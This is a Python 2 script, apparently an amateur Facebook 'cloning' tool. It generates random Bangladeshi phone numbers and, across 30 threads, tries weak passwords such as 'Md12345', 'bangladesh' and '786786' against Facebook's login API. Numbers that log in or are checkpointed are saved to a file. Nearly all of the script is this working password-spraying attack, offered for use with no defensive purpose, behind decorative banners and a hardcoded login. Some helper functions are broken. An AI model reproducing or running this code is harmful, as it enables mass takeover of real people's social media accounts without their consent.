# Ustad# SIDRA5# Thuglife# Somibro# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """

\033[1;95m░░░░░░░░▌░░░░░░░▐
\033[1;95m░░░░█░░▄▌░░░░▌░░░█░░░▄▄
\033[1;95m░░░░▐▄░▌░░░░▐▄▌░░░▀▄█▄
\033[1;95m░░░░░▐█░░░░░░░▌░▄█▀░░░▀█
\033[1;95m░░░▌░░▐░░░░░▄▀▀▀░░░░░░░░
\033[1;95m░░░▐░░░▀▄░█▀▄▄▄▄░░░░░░░░
\033[1;95m▌░░█▄░░░▐▄█░░░░▌▀▄░░░░░░
\033[1;95m█░░░▐░░░██░░░░░█░░▄░█▀░░
\033[1;95m▐░░░█░░░▐█░░░░░░░░▌▀░░░░
\033[1;95m░▌░░▌░░░▐█▄░░░░▄▄█▄▄▄░░░
\033[1;95m▄▄▀▄█░░░░██░▄█▀░█▄▄░▐▄▄░
\033[1;95m░░░░▀█▄░▄███░░░░░░░░░░░░
\033[1;95m░░░░░░█████░░░░░░░░░░░░░
\033[1;95m░░░░░░░▐███░░░░░░░░░░░░░
\033[1;95m░░░░░░░▐███░░░░░░░░░░░░░
\033[1;95m░░░░░░░▐████░░░░░░░░░░░░
\033[1;95m░░▒▒▒▒▒█████▒▒░░░░░░░░░░
\033[1;95m▒▒▒▒▒▒▄██████▒▒▒▒▒▒▒▒▒▒▒
\033[1;95m▒▒▄▄▄█▀▒█▀▐▀▀██▄▄▄▒▒▒▒▒▒
\033[1;95m█▀▐▒█▒▒▒▌▒▒▐▒▒▒▒▒▌▀▀▄▒▒▒

\033[1;95m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;95m██╔════╝██╔══██╗████╗░████║██║
\033[1;95m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;95m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;95m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
                   
\033[1;92m---------------------BRAND---------------------
\033[1;97m•••••••••••••••••••••STAR••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96mThe Credit For This Code Goes To Somi..
\033[1;97m•••••••••••••••••••••SOMI••••••••••••••••••••••••••••••••••••••••••••••••     
\033[1;91mDEVOLPER
                     SOMI BRAND
\033[1;94mFACEBOOK
                     SO MI MUSICAN
\033[1;91mYOUTUBE
                     SOMI RAPPER
\033[1;93mGITHUB
                     Somi190
\033[1;92mWHATAAPP
                      03455453538
\033[1;97m••••••••••••••••••••••BRAND•••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96mBlacklist Life gun mri wife Tour touch Sky..
\033[1;97m••••••••••••••••••••••STAR•••••••••••••••••••••••••••••••••••••••••••••••                
\033[1;92m--------------------SOMI----------------------
"""

####Logo####

logo1 = """


\033[1;91m░█▀▀▀█ ▀▀█▀▀ ─█▀▀█ ░█▀▀█ 　 
\033[1;97m─▀▀▀▄▄ ─░█── ░█▄▄█ ░█▄▄▀ 　 
\033[1;91m░█▄▄▄█ ─░█── ░█─░█ ░█─░█ 　 

\033[1;91m░█▀▀█ ░█▀▀▀█ ░█──░█ 
\033[1;97m░█▀▀▄ ░█──░█ ░█▄▄▄█ 
\033[1;91m░█▄▄█ ░█▄▄▄█ ──░█── 

\033[1;91m░█▀▀▀█ ░█▀▀▀█ 　 ░█▀▄▀█ ▀█▀ 
\033[1;97m─▀▀▀▄▄ ░█──░█ 　 ░█░█░█ ░█─ 
\033[1;91m░█▄▄▄█ ░█▄▄▄█ 　 ░█──░█ ▄█▄
\033[1;91m



\033[1;91m------------------SOMI----------------------
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96mThe Credit For This Code Goes To Somi..
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;91mDEVOLPER
                     SOMI BRAND
\033[1;94mFACEBOOK
                     SO MI MUSICAN
\033[1;91mYOUTUBE
                     SOMI RAPPER
\033[1;93mGITHUB
                     Somi190
\033[1;92mWHATAAPP
                      03455453538
\033[1;97m•••••••••••••STAR••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96mBlacklist Life gun mri wife Tour touch Sky..
\033[1;97m••••••••••••••Boy•••••••••••••••••••••••••••••••••••••••••••••••••••••••      

\033[1;95m-----------------SOMi------------------------
"""
logo2 = """

\033[1;91m000000000000000_000000000000000
\033[1;91m00000000000000___00000000000000
\033[1;91m0000000000000_____0000000000000
\033[1;91m000000000000_______000000000000
\033[1;91m00000000000_________00000000000
\033[1;91m0____________ YOU ___________00
\033[1;91m000_________ ........_________ 0000
\033[1;91m00000 _______ROCK!!_______ 00000
\033[1;91m0000000_________________0000000
\033[1;91m000000_________0_________000000
\033[1;91m00000_______0000000_______00000
\033[1;91m0000_____0000000000000_____0000
\033[1;91m000___0000000000000000000___000
\033[1;91m00_0000000000000000000000000_00
\033[1;93m╭━━━┳━━━━┳━━━┳━━━╮
\033[1;93m┃╭━╮┃╭╮╭╮┃╭━╮┃╭━╮┃
\033[1;95m┃╰━━╋╯┃┃╰┫┃╱┃┃╰━╯┃
\033[1;95m╰━━╮┃╱┃┃╱┃╰━╯┃╭╮╭╯
\033[1;93m┃╰━╯┃╱┃┃╱┃╭━╮┃┃┃╰╮
\033[1;93m╰━━━╯╱╰╯╱╰╯╱╰┻╯╰━╯
\033[1;93m╭━━╮
\033[1;93m┃╭╮┃
\033[1;95m┃╰╯╰┳━━┳╮╱╭╮
\033[1;95m┃╭━╮┃╭╮┃┃╱┃┃
\033[1;93m┃╰━╯┃╰╯┃╰━╯┃
\033[1;93m╰━━━┻━━┻━╮╭╯
\033[1;93m╱╱╱╱╱╱╱╭━╯┃
\033[1;93m╱╱╱╱╱╱╱╰━━╯
\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;93m██╔════╝██╔══██╗████╗░████║██║
\033[1;97m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;97m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;93m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;91m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
                   
\033[1;91m---------------------SOMI-------------------
\033[1;97m••••••••••••••••••BOY•••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96mThe Credit For This Code Goes To Somi..
\033[1;97m•••••••••••••••••••Star••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;91mDEVOLPER
                     SOMI BRAND
\033[1;94mFACEBOOK
                     SO MI MUSICAN
\033[1;91mYOUTUBE
                     SOMI RAPPER
\033[1;93mGITHUB
                     Somi190
\033[1;92mWHATAAPP
                      03455453538
\033[1;93m Updated Command✔✔✔
\033[1;91m ONLY BANGLADESH IDS 
\033[1;97m•••••••••••••••••••REAL••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96mBlacklist Life gun mri wife Tour touch Sky..
\033[1;97m••••••••••••••••••••STAR•••••••••••••••••••••••••••••••••••••••••••••••••      
                                                
\033[1;97m---------------------SOMI--------------------
"""
CorrectUsername = "SOMI"
CorrectPassword = "STAR"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m\x1b[1;92mU/N \x1b[1;93m〰> \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m \x1b[1;92mU/P  \x1b[1;93m〰> \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:SOMI
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://m.facebook.comSOMIMISICAN.com')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://m.facebook.comSOMIMUSICAN.com')



##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;91m[1]\x1b[1;91mSTART BANGLADESH( \033[1;92m NOW)"
    time.sleep(0.05)
    print "\033[1;95m[2]\x1b[1;93mUPDATE (9.0)"
    time.sleep(0.05)
    print '\x1b[1;94m[0]\033[1;91m Exit ( Back)'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;95mCHOOSE: \033[1;93m")
    if peak =="":
        print "\x1b[1;97mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;91m[1]  START CLONING With SOMI'
    time.sleep(0.10)
    print '\x1b[1;92m[2] SOMI FB ACCOUNT'
    time.sleep(0.10)
    print '\x1b[1;95m[3] MORE INFO'
    time.sleep(0.10)
    print '\x1b[1;96m[4] TRACKER'
    time.sleep(0.10)
    print '\x1b[1;97m[5] CLONING ERROR'
    time.sleep(0.10)
    print '\x1b[1;91m[6] SOMI FACEBOOK'
    time.sleep(0.10)
    print '\x1b[1;94m[0] back'
   
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;97mCHOOSE:\033[1;97m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print "Enter any BANGLADESH Mobile code Number"+'\n'
        print 'Enter any code 175,165,191, 192, 193, 194, 195, 196, 197, 198, 199'
        print 'LOCK PROFIL IDS '
        print 'Only bangladesh phone number'
        try:
            c = raw_input("\033[1;97mCHOOSE : ")
            k="+880"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;94m-'
    xxx = str(len(id))
    jalan("\033[0;95m▇ ▇ ▇ ▇ ▇ ▇ ♚10%") 
    jalan("\033[0;95m▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚20%")
    jalan("\033[0;95m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚30%")
    jalan("\033[0;95m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚40%")
    jalan("\033[0;93m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚50%")
    jalan("\033[0;93m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚60%")
    jalan("\033[0;93m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚70%")
    jalan("\033[0;91m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚80%")
    jalan("\033[0;91m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚90%")
    jalan("\033[0;91m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚100%")
    jalan ('\033[1;95m Total ids number: '+xxx)
    jalan ('\033[1;92mCode you choose: '+c)
    jalan ("\033[1;93mWait A While Start Cracking...")
    jalan ("\033[1;94mTo Stop Process Press Ctrl+z")
    print 50* '\033[1;97m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(OHH NO) ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Enjoy)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;92m(OHH NO) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="Md12345"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;92m(OHH NO) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="bangladesh"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;92m(OHH NO) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="786786"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;92m(ohh no) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                      
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 10 to 20 days")
    print ''
    print """
    ███
──────────███║║║║║║║███
─────────█║║║║║║║║║║║║║█
────────█║║║║███████║║║║█
───────█║║║║██─────██║║║║█
──────█║║║║██───────██║║║║█
─────█║║║║██─────────██║║║║█
─────█║║║██───────────██║║║█
─────█║║║█─────────────█║║║█
─────█║║║█─────────────█║║║█
─────█║║║█─────────────█║║║█
─────█║║║█─────────────█║║║█
────███████───────────███████
───██║║║║║║██────────██║║║║║██
──██║║║║║║║║██──────██║║║║║║║██
─██║║║║║║║║║║██───██║║║║║║║║║║██
██║║║║║║║║║║║║█████║║║║║║║║║║║║██
█║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║█
█║║║║║║║║║║║║║█████║║║║║║║║║║║║║█
█║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
█║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
█║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
██║║║║║║║║║║║█░░░░░█║║║║║║║║║║║██
██║║║║║║║║║║║║█░░░█║║║║║║║║║║║║██
─██║║║║║║║║║║║█░░░█║║║║║║║║║║║██
──██║║║║║║║║║║█░░░█║║║║║║║║║║██
───██║║║║║║║║║█░░░█║║║║║║║║║██
────██║║║║║║║║█████║║║║║║║║██
─────██║║║║║║║║███║║║║║║║║██
──────██║║║║║║║║║║║║║║║║║██
───────██║║║║║║║║║║║║║║║██
────────██║║║║║║║║║║║║║██
─────────██║║║║║║║║║║║██
──────────██║║║║║║║║║██
───────────██║║║║║║║██
────────────██║║║║║██
─────────────██║║║██
──────────────██║██
───────────────███
───────────────────────▄██▄▄██▄
──────────────────────██████████
──────────────────────▀████████▀
────────────────────────▀████▀
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
──────────────────────▄▄▄████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▄█████▀



\033[1;96mThanks me later
\033[1;95mFb\033[1;97mSOmi
\033[1;95myoutube\033[1;97mhttps://w ww.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()

